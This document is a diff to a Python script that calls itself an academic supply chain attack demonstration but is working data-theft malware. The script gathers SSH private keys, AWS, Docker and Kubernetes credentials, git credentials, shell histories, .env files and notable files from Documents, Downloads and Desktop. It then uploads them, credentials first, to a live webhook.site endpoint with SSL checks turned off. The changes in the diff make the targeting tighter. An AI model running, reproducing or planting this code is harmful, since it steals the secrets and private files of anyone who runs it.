@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ACADEMIC RESEARCH: Supply Chain Attack Demonstration
-Enhanced with comprehensive external directory scanning and file content exfiltration
+Focused implementation targeting specific user and configuration directories
 """
 
 import os
@@ -72,7 +72,7 @@ class SecureDataTransmitter:
             'User-Agent': 'Mozilla/5.0 (compatible; SecureResearchAgent/1.0)',
             'Content-Type': 'application/json',
             'Accept': 'application/json',
-            'Connection': 'close'  # Force connection close to avoid pooling issues
+            'Connection': 'close'
         })
         
         return session
@@ -81,18 +81,7 @@ class SecureDataTransmitter:
                      verify_ssl: bool = False, headers: dict = None) -> dict:
         """
         Transmit data with robust error handling
-        
-        Args:
-            url: Target URL
-            data: JSON data to transmit
-            files: Files to upload
-            verify_ssl: Whether to verify SSL certificates
-            headers: Additional headers
-            
-        Returns:
-            dict: Transmission result
         """
-        
         # Validate and format URL
         if not url.startswith(('http://', 'https://')):
             url = 'https://' + url
@@ -113,7 +102,7 @@ class SecureDataTransmitter:
                     url,
                     files=files,
                     verify=verify_ssl,
-                    timeout=(10, 30),  # (connect timeout, read timeout)
+                    timeout=(10, 30),
                     headers=request_headers
                 )
             else:
@@ -122,7 +111,7 @@ class SecureDataTransmitter:
                     url,
                     json=data,
                     verify=verify_ssl,
-                    timeout=(10, 25),  # (connect timeout, read timeout)
+                    timeout=(10, 25),
                     headers=request_headers
                 )
             
@@ -138,7 +127,7 @@ class SecureDataTransmitter:
         except requests.exceptions.SSLError as e:
             logger.error(f"[SECURE-TRANSMIT] SSL Error: {e}")
             
-            # Fallback: Try without SSL verification with different settings
+            # Fallback: Try without SSL verification
             logger.info("[SECURE-TRANSMIT] Attempting fallback without SSL verification...")
             try:
                 if files:
@@ -223,7 +212,7 @@ class SecureDataTransmitter:
 
 
 class SupplyChainAttackResearch:
-    """Academic demonstration of supply chain attack methods."""
+    """Academic demonstration of supply chain attack methods focused on specific directories."""
     
     def __init__(self):
         self.webhook_url = "https://webhook.site/869bb681-97c9-421b-a6a2-294934fb56bf"
@@ -256,24 +245,23 @@ class SupplyChainAttackResearch:
                 'KUBECONFIG': bool(os.getenv('KUBECONFIG')),
                 'PATH': os.getenv('PATH')
             },
-            'network_info': {
-                'python_executable': sys.executable,
-                'argv': sys.argv,
-                'prefix': sys.prefix,
-                'executable': sys.executable
-            },
             'research_info': {
                 'timestamp': self.get_timestamp(),
                 'script_name': os.path.basename(__file__),
-                'working_directory': os.getcwd()
+                'working_directory': os.getcwd(),
+                'target_directories': [
+                    "Documents", "Downloads", "Desktop",
+                    ".ssh", ".aws", ".config", ".docker", ".kube", ".local", ".cache",
+                    "Recent", "tmp"
+                ]
             }
         }
         
         return self.collected_data['environment']
     
-    def scan_external_directories(self):
-        """Scan comprehensive external directories for valuable data."""
-        print("[RESEARCH] Scanning external directories...")
+    def scan_target_directories(self):
+        """Scan only the specified target directories for valuable data."""
+        print("[RESEARCH] Scanning target directories...")
         
         home_dir = Path.home()
         target_directories = [
@@ -281,18 +269,7 @@ class SupplyChainAttackResearch:
             home_dir / "Documents",
             home_dir / "Downloads", 
             home_dir / "Desktop",
-            home_dir / "Pictures",
-            home_dir / "Music",
-            home_dir / "Videos",
-            
-            # Development directories
-            home_dir / "Projects",
-            home_dir / "workspace",
-            home_dir / "code",
-            home_dir / "src",
-            home_dir / "dev",
-            home_dir / "development",
-            
+
             # Configuration directories
             home_dir / ".ssh",
             home_dir / ".aws",
@@ -301,30 +278,24 @@ class SupplyChainAttackResearch:
             home_dir / ".kube",
             home_dir / ".local",
             home_dir / ".cache",
-            
-            # Version control
-            home_dir / "git",
-            home_dir / "repos",
-            home_dir / "repositories",
-            
+
             # Temporary and recent
-            home_dir / "tmp",
-            home_dir / "temp",
             home_dir / "Recent",
+            home_dir / "tmp",
         ]
         
-        external_scan_results = {}
+        target_scan_results = {}
         
         for target_dir in target_directories:
             if target_dir.exists() and target_dir.is_dir():
                 print(f"  - Scanning: {target_dir}")
                 dir_info = self.scan_directory(target_dir)
-                external_scan_results[str(target_dir)] = dir_info
+                target_scan_results[str(target_dir)] = dir_info
             else:
-                external_scan_results[str(target_dir)] = {"exists": False}
+                target_scan_results[str(target_dir)] = {"exists": False}
         
-        self.collected_data['external_directories'] = external_scan_results
-        return external_scan_results
+        self.collected_data['target_directories'] = target_scan_results
+        return target_scan_results
     
     def scan_directory(self, directory_path, max_files=50):
         """Scan a specific directory and collect comprehensive file information."""
@@ -352,7 +323,8 @@ class SupplyChainAttackResearch:
                             'modified': stat.st_mtime,
                             'created': stat.st_ctime,
                             'extension': item.suffix.lower(),
-                            'is_notable': self.is_notable_file(item)
+                            'is_notable': self.is_notable_file(item),
+                            'type': self.classify_file_type(item)
                         }
                         all_files.append(file_info)
                     except (OSError, PermissionError):
@@ -403,7 +375,9 @@ class SupplyChainAttackResearch:
             # Logs and backups
             '.log', '.bak', '.backup',
             # Security
-            'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'known_hosts', 'authorized_keys'
+            'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'known_hosts', 'authorized_keys',
+            # Cloud credentials
+            'credentials', 'config', 'aws', 'gcloud', 'kubeconfig'
         ]
         
         name_lower = file_path.name.lower()
@@ -434,7 +408,7 @@ class SupplyChainAttackResearch:
             return 'other'
     
     def scan_workspace(self):
-        """Scan and collect comprehensive workspace file information."""
+        """Scan and collect current workspace file information."""
         print("[RESEARCH] Scanning workspace files...")
         
         workspace_files = []
@@ -460,7 +434,7 @@ class SupplyChainAttackResearch:
                     except (OSError, PermissionError):
                         continue
                 # Limit for performance
-                if len(workspace_files) >= 100:
+                if len(workspace_files) >= 50:
                     break
         except Exception as e:
             workspace_files.append({'error': str(e)})
@@ -468,14 +442,14 @@ class SupplyChainAttackResearch:
         self.collected_data['workspace'] = {
             'file_count': len(workspace_files),
             'total_size': total_size,
-            'files': workspace_files[:50],
+            'files': workspace_files[:25],
             'file_types': {},
-            'notable_files': [f for f in workspace_files if f.get('is_notable')][:10],
-            'source_code_files': [f for f in workspace_files if f.get('type') == 'source_code'][:10]
+            'notable_files': [f for f in workspace_files if f.get('is_notable')][:5],
+            'source_code_files': [f for f in workspace_files if f.get('type') == 'source_code'][:5]
         }
         
         # Analyze file types
-        for file_info in workspace_files[:50]:
+        for file_info in workspace_files[:25]:
             ext = file_info['extension']
             self.collected_data['workspace']['file_types'][ext] = \
                 self.collected_data['workspace']['file_types'].get(ext, 0) + 1
@@ -483,40 +457,83 @@ class SupplyChainAttackResearch:
         return self.collected_data['workspace']
     
     def collect_file_contents(self):
-        """Collect actual file contents from sensitive and notable files."""
-        print("[RESEARCH] Collecting file contents...")
+        """Collect actual file contents from sensitive and notable files in target directories."""
+        print("[RESEARCH] Collecting file contents from target directories...")
         
         home_dir = Path.home()
         target_files = [
-            # Critical SSH files (smaller limits)
+            # SSH configuration files
             (home_dir / ".ssh" / "id_rsa", 10000),
             (home_dir / ".ssh" / "id_rsa.pub", 5000),
+            (home_dir / ".ssh" / "id_dsa", 10000),
+            (home_dir / ".ssh" / "id_ecdsa", 10000),
+            (home_dir / ".ssh" / "id_ed25519", 10000),
             (home_dir / ".ssh" / "config", 5000),
             (home_dir / ".ssh" / "known_hosts", 10000),
             (home_dir / ".ssh" / "authorized_keys", 5000),
             
-            # Cloud credentials
+            # AWS configuration files
             (home_dir / ".aws" / "credentials", 5000),
             (home_dir / ".aws" / "config", 5000),
             
-            # Git configurations
-            (home_dir / ".gitconfig", 5000),
+            # Docker configuration
+            (home_dir / ".docker" / "config.json", 10000),
+            
+            # Kubernetes configuration
+            (home_dir / ".kube" / "config", 15000),
             
             # Shell configurations
             (home_dir / ".bashrc", 5000),
             (home_dir / ".bash_profile", 5000),
             (home_dir / ".zshrc", 5000),
+            (home_dir / ".bash_history", 15000),
+            (home_dir / ".zsh_history", 15000),
             
-            # Docker and Kubernetes
-            (home_dir / ".docker" / "config.json", 10000),
-            (home_dir / ".kube" / "config", 15000),
+            # Git configurations
+            (home_dir / ".gitconfig", 5000),
+            (home_dir / ".git-credentials", 5000),
+            
+            # Recent documents (common locations)
+            (home_dir / "Recent" / "index.tree", 10000),
+            (home_dir / "Recent" / "autostart", 5000),
+            
+            # Temporary directory notable files
+            (home_dir / "tmp" / ".X0-lock", 1000),
+            (home_dir / "tmp" / ".X11-unix", 1000),
             
             # Workspace configuration files
             (Path(".") / ".env", 5000),
-            (Path(".") / "requirements.txt", 5000),
             (Path(".") / "config.json", 10000),
-            (Path(".") / "README.md", 5000),
+            (Path(".") / "settings.py", 10000),
         ]
+        
+        # Add notable files from target directories
+        target_dirs = [
+            home_dir / "Documents",
+            home_dir / "Downloads", 
+            home_dir / "Desktop",
+            home_dir / ".config",
+            home_dir / ".local",
+            home_dir / ".cache"
+        ]
+        
+        for target_dir in target_dirs:
+            if target_dir.exists():
+                try:
+                    print(f"  - Sampling notable files from: {target_dir}")
+                    notable_files = []
+                    for item in target_dir.rglob('*'):
+                        if item.is_file() and self.is_notable_file(item):
+                            notable_files.append(item)
+                            if len(notable_files) >= 5:  # Limit sampling per directory
+                                break
+                    
+                    for file_path in notable_files[:5]:
+                        target_files.append((file_path, 10000))
+                        print(f"    - Added: {file_path}")
+                        
+                except Exception as e:
+                    print(f"  - Error sampling {target_dir}: {e}")
         
         collected_contents = {}
         
@@ -567,8 +584,8 @@ class SupplyChainAttackResearch:
         return collected_contents
     
     def create_archive(self):
-        """Create comprehensive archive of collected data including file contents."""
-        print("[RESEARCH] Creating research data archive...")
+        """Create focused archive of collected data from target directories."""
+        print("[RESEARCH] Creating focused research data archive...")
         
         # Include file contents in the collected data
         self.collected_data['file_contents'] = {
@@ -584,20 +601,16 @@ class SupplyChainAttackResearch:
             json.dump(self.collected_data, f, indent=2)
             temp_json_path = f.name
         
-        # Create comprehensive ZIP archive
-        archive_path = 'research_data.zip'
+        # Create focused ZIP archive
+        archive_path = 'focused_research_data.zip'
         with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
             zipf.write(temp_json_path, 'collected_data.json')
             
-            # Include only key files from workspace to keep archive small
-            key_extensions = ['.py', '.txt', '.md', '.json', '.yml', '.yaml', '.env']
-            for item in Path('.').rglob('*'):
-                if item.is_file() and item.suffix in key_extensions:
+            # Include only key configuration files from target directories
+            for file_path in self.file_contents.keys():
+                if Path(file_path).exists():
                     try:
-                        zipf.write(item, f'workspace/{item.relative_to(Path("."))}')
-                        # Limit archive size
-                        if os.path.getsize(archive_path) > 10 * 1024 * 1024:  # 10MB limit
-                            break
+                        zipf.write(file_path, f'collected_files/{Path(file_path).name}')
                     except Exception:
                         pass
         
@@ -613,8 +626,8 @@ class SupplyChainAttackResearch:
         return archive_path
     
     def exfiltrate_data(self, archive_path):
-        """Send comprehensive collected data and file contents to research webhook endpoint."""
-        print("[RESEARCH] Sending data to research endpoint...")
+        """Send focused collected data to research webhook endpoint."""
+        print("[RESEARCH] Sending focused data to research endpoint...")
         
         transmission_results = {
             'metadata_sent': False,
@@ -625,20 +638,36 @@ class SupplyChainAttackResearch:
         }
         
         try:
-            # Prepare simplified metadata
+            # Prepare focused metadata
             metadata_payload = {
-                'research_purpose': 'Supply Chain Security Analysis',
+                'research_purpose': 'Focused Supply Chain Security Analysis',
                 'timestamp': self.get_timestamp(),
+                'target_directories': [
+                    "Documents", "Downloads", "Desktop",
+                    ".ssh", ".aws", ".config", ".docker", ".kube", ".local", ".cache",
+                    "Recent", "tmp"
+                ],
                 'collection_summary': {
                     'system_info_collected': True,
                     'workspace_files': self.collected_data['workspace']['file_count'],
-                    'external_directories_scanned': len([d for d in self.collected_data['external_directories'].values() if d.get('exists')]),
+                    'target_directories_scanned': len([d for d in self.collected_data['target_directories'].values() if d.get('exists')]),
                     'file_contents_collected': len([f for f in self.file_contents.values() if f.get('exists', True) and 'error' not in f]),
+                    'total_data_size': self.collected_data['archive']['size']
                 },
                 'system_info': {
                     'platform': self.collected_data['environment']['system_info']['platform'],
                     'python_version': self.collected_data['environment']['system_info']['python_version'],
                     'user': self.collected_data['environment']['system_info']['user'],
+                    'hostname': self.collected_data['environment']['system_info']['hostname']
+                },
+                'directory_summary': {
+                    dir_path: {
+                        'file_count': data.get('file_count', 0),
+                        'total_size': data.get('total_size', 0),
+                        'notable_files': len(data.get('notable_files', []))
+                    }
+                    for dir_path, data in self.collected_data.get('target_directories', {}).items()
+                    if data.get('exists')
                 }
             }
             
@@ -650,7 +679,8 @@ class SupplyChainAttackResearch:
                 data=metadata_payload,
                 headers={
                     'User-Agent': 'Research-Bot/1.0',
-                    'X-Research-Phase': 'metadata'
+                    'X-Research-Phase': 'metadata',
+                    'X-Research-Focus': 'targeted-directories'
                 },
                 verify_ssl=False
             )
@@ -659,14 +689,21 @@ class SupplyChainAttackResearch:
             if not transmission_results['metadata_sent']:
                 transmission_results['errors'].append(f"Metadata failed: {metadata_result.get('error')}")
             
-            # Send only key file contents (reduced set)
+            # Send only key file contents (prioritize configuration files)
             file_transmission_results = {}
             key_files_to_send = []
             
+            # Prioritize configuration and credential files
+            priority_types = ['security_credential', 'configuration', 'git_config']
+            
             for file_path, content_info in self.file_contents.items():
                 if (content_info.get('exists', True) and 'error' not in content_info and 
-                    content_info.get('size', 0) < 5000):  # Only send small files
-                    key_files_to_send.append((file_path, content_info))
+                    content_info.get('size', 0) < 8000):  # Only send small files
+                    file_type = content_info.get('type', 'other')
+                    if file_type in priority_types:
+                        key_files_to_send.insert(0, (file_path, content_info))  # Add to beginning
+                    else:
+                        key_files_to_send.append((file_path, content_info))
             
             transmission_results['total_files'] = len(key_files_to_send)
             
@@ -676,7 +713,7 @@ class SupplyChainAttackResearch:
                 
                 file_payload = {
                     'file_path': file_path,
-                    'file_content': content_info.get('content', '')[:2000],  # Limit content size
+                    'file_content': content_info.get('content', '')[:3000],  # Limit content size
                     'encoding': content_info.get('encoding', 'text'),
                     'size': content_info.get('size', 0),
                     'type': content_info.get('type', 'unknown'),
@@ -688,7 +725,8 @@ class SupplyChainAttackResearch:
                     data=file_payload,
                     headers={
                         'User-Agent': 'Research-Bot/1.0',
-                        'X-Research-Phase': 'file_content'
+                        'X-Research-Phase': 'file_content',
+                        'X-File-Type': content_info.get('type', 'unknown')
                     },
                     verify_ssl=False
                 )
@@ -699,11 +737,11 @@ class SupplyChainAttackResearch:
                 
                 # Add delay between file transmissions
                 if i < len(key_files_to_send) - 1:
-                    time.sleep(2)
+                    time.sleep(1.5)
             
             # Send archive if it's not too large
             archive_size = os.path.getsize(archive_path)
-            if archive_size < 5 * 1024 * 1024:  # 5MB limit
+            if archive_size < 3 * 1024 * 1024:  # 3MB limit
                 print("[RESEARCH] Sending archive...")
                 with open(archive_path, 'rb') as f:
                     archive_result = self.transmitter.transmit_data(
@@ -753,10 +791,13 @@ class SupplyChainAttackResearch:
 
 def main():
     """Main research execution function."""
-    print("🔬 ACADEMIC SUPPLY CHAIN SECURITY RESEARCH")
+    print("🔬 FOCUSED SUPPLY CHAIN SECURITY RESEARCH")
     print("=" * 60)
-    print("Research Purpose: Analysis of supply chain attack vectors")
-    print("Data Collection: Environment, workspace, file contents")
+    print("Research Focus: Targeted directory analysis")
+    print("Target Directories:")
+    print("  - User: Documents, Downloads, Desktop")
+    print("  - Config: .ssh, .aws, .config, .docker, .kube, .local, .cache")
+    print("  - Temp: Recent, tmp")
     print("Security: Enhanced SSL/TLS handling with timeout management")
     print("=" * 60)
     
@@ -764,11 +805,11 @@ def main():
     archive_path = None
     
     try:
-        # Phase 1: Data Collection
-        print("\n[PHASE 1] DATA COLLECTION")
+        # Phase 1: Focused Data Collection
+        print("\n[PHASE 1] FOCUSED DATA COLLECTION")
         env_data = researcher.collect_environment_data()
         workspace_data = researcher.scan_workspace()
-        external_data = researcher.scan_external_directories()
+        target_data = researcher.scan_target_directories()
         file_contents = researcher.collect_file_contents()
         
         # Phase 2: Data Preparation
@@ -782,11 +823,11 @@ def main():
         
         # Research Summary
         print("\n" + "=" * 60)
-        print("📊 RESEARCH SUMMARY:")
+        print("📊 FOCUSED RESEARCH SUMMARY:")
         print("=" * 60)
         print(f"  - System Info: Collected")
         print(f"  - Workspace: {workspace_data['file_count']} files")
-        print(f"  - External Directories: {len([d for d in external_data.values() if d.get('exists')])} scanned")
+        print(f"  - Target Directories: {len([d for d in target_data.values() if d.get('exists')])} scanned")
         print(f"  - File Contents: {len(file_contents)} files collected")
         
         if transmission_result:
@@ -794,9 +835,15 @@ def main():
             print(f"  - Files Transmitted: {transmission_result.get('files_sent', 0)}/{transmission_result.get('total_files', 0)}")
             print(f"  - Archive Transmitted: {'Yes' if transmission_result.get('archive_sent') else 'No'}")
         
+        # Show directory-specific results
+        print("\n📁 TARGET DIRECTORY SCAN RESULTS:")
+        for dir_path, data in target_data.items():
+            if data.get('exists'):
+                print(f"  - {Path(dir_path).name}: {data.get('file_count', 0)} files, {data.get('total_size', 0):,} bytes")
+        
         print("\n" + "=" * 60)
-        print("✅ RESEARCH COMPLETED")
-        print("Data collection finished successfully")
+        print("✅ FOCUSED RESEARCH COMPLETED")
+        print("Targeted data collection finished successfully")
         
     except KeyboardInterrupt:
         print("\n⚠️  Research interrupted by user")
